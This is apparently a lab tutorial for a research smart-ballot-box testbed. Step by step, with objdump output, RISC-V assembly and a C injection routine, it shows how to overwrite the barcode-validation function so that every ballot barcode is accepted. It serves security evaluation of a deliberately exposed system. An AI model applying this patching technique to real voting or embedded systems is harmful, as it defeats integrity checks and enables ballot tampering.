This is an example of how to overwrite instructions in the SBB code. The peek-poke server won't let you write directly to SBB instructions, but you can use it to write instructions to the `malware` function that will write to the SBB code. This exploit walks through how to overwrite the function responsible for validating barcodes to always return `BARCODE_VALID`.

# Examine the SBB source code & use objdump

As you might be able to predict by thinking about how the SBB source code works, there is a function that is called to validate whether a given barcode is valid. Let's find this function and see what it does.

Looking at the code that controls the SBB state machine, we see a function called [`run_barcode_detected`](../../../source/sbb/sbb_machine.c#L279). This function calls [`is_barcode_valid`](../../../source/sbb/sbb.c#L93), which is a wrapper over [`crypto_check_barcode_valid`](../../../source/sbb/sbb_crypto.c#L61).

The `crypto_check_barcode_valid` function returns a `barcode_validity` enum, which is defined [here](https://gitlab-ext.galois.com/ssith/voting-system/blob/master/source/sbb/sbb_t.h#L93):

```
typedef enum { // invalid barcode classifications
              BARCODE_VALID,
              BARCODE_INVALID_LENGTH,
              BARCODE_INVALID_ENCODING,
              BARCODE_INVALID_SIGNATURE,
              BARCODE_INVALID_TIMESTAMP,
              BARCODE_INVALID_OTHER,
} barcode_validity;
```

Each member of that enum will be compiled to the index at which they appear; this means that `BARCODE_VALID`, the value you would like to return, will compile to `0`.

Your goal, then, is to overwrite `crypto_check_barcode_valid` to always return 0, which will be interpreted as the `BARCODE_VALID` value.

Let's find the address of that `crypto_check_barcode_valid` starts at:

```
```

Examining the objdump in your favorite text editor, you can find the relevant address:
```
c0026f3c <crypto_check_barcode_valid>:
c0026f3c:       f8010113                addi    sp,sp,-128
c0026f40:       06112e23                sw      ra,124(sp)
c0026f44:       06812c23                sw      s0,120(sp)
c0026f48:       08010413                addi    s0,sp,128
c0026f4c:       f8a42623                sw      a0,-116(s0)
```

Here you'll want `0xc0026f3c`. Note that because we want to overwrite the function to simple return 0 we can step on the part of the function which sets up the stack by moving the stack pointer (sp), but for some more complicated exploits you might want to mind the setup & tear down part of the function body.

To construct this exploit you will need to take two steps: first, get the hex representation of the instructions necessary to return 0, and then get the assembly which writes those instructions to the correct memory location (the beginning of the `crypto_check_barcode_valid` function). This is because the peek-poke server will only let you write instructions to the `malware` function; you cannot write these instructions directly.

# Binary for return 0

First let's get the hex for the RISC-V assembly instructions for the function which simply returns 0. In RISC-V the return value is passed in register `a0`, so the instructions are:

```
mv a0, zero
ret
```

Simple. For more complicated operations you may wish to use a compiler; the [godbolt compiler explorer](https://godbolt.org/z/o15-m-) is a useful online tool. Just be mindful that the highlighting does not always match up exactly to the source code.

Next, let's save this into a file called `return-0.asm` and get the hex for these instructions:

```
[nix-shell]$ riscv32-unknown-elf-as -o return-0.elf return-0.asm
[nix-shell]$ riscv32-unknown-elf-objdump -d return-0.elf
...
Disassembly of section .text:

00000000 <.text>:
   0:	00000513          	li	a0,0
   4:	00008067          	ret
```

Next up: write those hex values (`0x00000513` and `0x00008067`) to the location of the first instruction in `crypto_check_barcode_valid` (`0xc0026f3c`).

# Inject the return 0 instructions

Let's write [another C program](https://godbolt.org/z/sjD4CL) that has the desired effect:

```
void exploit() {
    // write to the address of crypto_check_barcode_valid
    int *x = (int *)0xc0026f3c;
    // this is the "load 0 into a0" instruction
    x[0] = 0x00000513;
    // this is the "ret" instruction
    x[1] = 0x00008067;
}
```

Get the RISC-V 32-bit assembly for this function, and pick out the bits relevant to the function body (everything between the instructions that move the stack pointer "sp" around):

```
lui     a0, 786471
addi    a0, a0, -196
sw      a0, -12(s0)
lw      a0, -12(s0)
addi    a1, zero, 1299
sw      a1, 0(a0)
lw      a0, -12(s0)
lui     a1, 8
addi    a1, a1, 103
sw      a1, 4(a0)
```

Save this into a file called `inject-return-0.asm`. We can use this file as the payload to the `run_exploit.sh` script.

# Run the exploit

Move a directory down and call `run_exploit.sh`:

```
cd ..; ./run_exploit.sh inject-return-0.asm
```

Remember that you need to set the `SBB_IP` and `malware_start_addr` environment variables before running `run_exploit.sh`. For a more in-depth explanation, see the [AES-key-to-display README](../AES-key-to-display/README.md).

# Recap

This example demonstrated how to rewrite the body of a function in the source code with your own sequence of instructions (though this sequence must be no longer than the original function body). To do this, you:

* found the function you wanted to overwrite, and what you wanted to overwrite it with, by inspecting the source code
* found the memory location of the first instruction in the function you wanted to write using objdump
* got the assembly for the instructions you wanted to write
    * In this simple example you put them together manually; you could also use a compiler
* got the hex values of those instructions using objdump
* wrote a C program which wrote those hex values to the memory location of the first instruction in the function you wanted to overwrite
    * If you want to modify control-flow in a more complicated way, you will need to be careful to not step on the stack frame setup & tear-down code at the beginning and end of the function
* got the assembly for this function using a RISC-V 32-bit compiler
* ran `./run_exploit.sh` with that assembly as the payload
